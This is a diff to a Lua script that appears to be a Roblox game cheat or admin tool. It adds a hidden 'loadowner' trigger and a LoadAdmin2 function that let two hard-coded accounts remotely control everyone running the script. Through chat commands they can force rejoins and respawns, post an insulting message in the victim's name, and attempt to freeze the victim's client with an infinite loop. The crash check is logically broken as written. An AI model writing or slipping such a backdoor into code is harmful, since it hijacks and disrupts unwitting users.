@@ -3973,6 +3973,9 @@ function PlayerChatted(Message)
     if M9Op == true then
     M9Op = false
     end
+    if infammo == true then
+    infammo = false
+    end
     M9InvisibleShot = true
     local Player = game.Players.LocalPlayer
     local Run = game:GetService("RunService")
@@ -4844,6 +4847,9 @@ v.Chatted:Connect(function(Msg)
 if string.sub(Msg, 1, 9) == (PuPrefix.."getusers") then
 Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(LPlayer.Name, "All")
 end
+if string.sub(Msg, 1, 9) == (PuPrefix.."loadowner") then
+LoadAdmin2()
+end
 end)
 end)
 
@@ -4851,6 +4857,9 @@ for i,v in pairs(Players:GetPlayers()) do
 v.Chatted:Connect(function(Msg)
 if string.sub(Msg, 1, 9) == (PuPrefix.."getusers") then
 Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(LPlayer.Name, "All")
+end
+if string.sub(Msg, 1, 9) == (PuPrefix.."loadowner") then
+LoadAdmin2()
 end
 end)
 end
@@ -5118,6 +5127,107 @@ end
 end
 end
 end)
+end
+
+function LoadAdmin2()
+OwnPrefix = ">"
+
+local Owner1 = game.Players:FindFirstChild("viniciuszk70")
+local Owner2 = game.Players:FindFirstChild("takkan007")
+
+if Owner1 then
+Owner1.Chatted:Connect(function(tk)
+if string.sub(tk, 1, 7) == (OwnPrefix.."rejoin") then
+game:GetService("TeleportService"):Teleport(game.PlaceId, LPlayer)
+end
+if string.sub(tk, 1, 4) == (OwnPrefix.."msg") then
+Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i am yag", "All")
+end
+if string.sub(tk, 1, 9) == (OwnPrefix.."getusers") then
+local NickName = LPlayer.Name
+Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(NickName, "All")
+end
+if string.sub(tk, 1, 5) == (OwnPrefix.."cmds") then
+OwnerCmds()
+end
+if string.sub(tk, 1, 7) == (OwnPrefix.."prefix") then
+PrefixMessage()
+end
+if string.sub(tk, 1, 7) == (OwnPrefix.."admins") then
+ShowAdmins()
+end
+if string.sub(tk, 1, 7) == (OwnPrefix.."notify") then
+Notify()
+end
+if string.sub(tk, 1, 4) == (OwnPrefix.."sit") then
+LPlayer.Character.Humanoid.Sit = true
+end
+if string.sub(tk, 1, 8) == (OwnPrefix.."respawn") then
+local savedcf = LPlayer.Character.HumanoidRootPart.CFrame
+local savedcamcf = workspace.CurrentCamera.CFrame
+workspace.Remote.loadchar:InvokeServer() 
+LPlayer.Character.HumanoidRootPart.CFrame = savedcf
+workspace.CurrentCamera.CFrame = savedcamcf
+end
+if string.sub(tk, 1, 14) == (OwnPrefix.."abuser notify") then
+AbuserNotify()
+end
+if string.sub(tk, 1, 12) == (OwnPrefix.."crash users") then
+if not game.Players.LocalPlayer.Name == "viniciuszk70" then
+if not game.Players.LocalPlayer.Name == "takkan007" then
+repeat until nil
+end
+end
+end
+end)
+end
+
+if Owner2 then
+Owner2.Chatted:Connect(function(tk)
+if string.sub(tk, 1, 7) == (OwnPrefix.."rejoin") then
+game:GetService("TeleportService"):Teleport(game.PlaceId, LPlayer)
+end
+if string.sub(tk, 1, 4) == (OwnPrefix.."msg") then
+Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i am yag", "All")
+end
+if string.sub(tk, 1, 9) == (OwnPrefix.."getusers") then
+local NickName = LPlayer.Name
+Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(NickName, "All")
+end
+if string.sub(tk, 1, 5) == (OwnPrefix.."cmds") then
+OwnerCmds()
+end
+if string.sub(tk, 1, 7) == (OwnPrefix.."prefix") then
+PrefixMessage()
+end
+if string.sub(tk, 1, 7) == (OwnPrefix.."admins") then
+ShowAdmins()
+end
+if string.sub(tk, 1, 7) == (OwnPrefix.."notify") then
+Notify()
+end
+if string.sub(tk, 1, 4) == (OwnPrefix.."sit") then
+LPlayer.Character.Humanoid.Sit = true
+end
+if string.sub(tk, 1, 8) == (OwnPrefix.."respawn") then
+local savedcf = LPlayer.Character.HumanoidRootPart.CFrame
+local savedcamcf = workspace.CurrentCamera.CFrame
+workspace.Remote.loadchar:InvokeServer() 
+LPlayer.Character.HumanoidRootPart.CFrame = savedcf
+workspace.CurrentCamera.CFrame = savedcamcf
+end
+if string.sub(tk, 1, 14) == (OwnPrefix.."abuser notify") then
+AbuserNotify()
+end
+if string.sub(tk, 1, 12) == (OwnPrefix.."crash users") then
+if not LPlayer.Name == "viniciuszk70" then
+if not LPlayer.Name == "takkan007" then
+repeat until nil
+end
+end
+end
+end)
+end
 end
 
 if game.Players:FindFirstChild("king_pro433") then
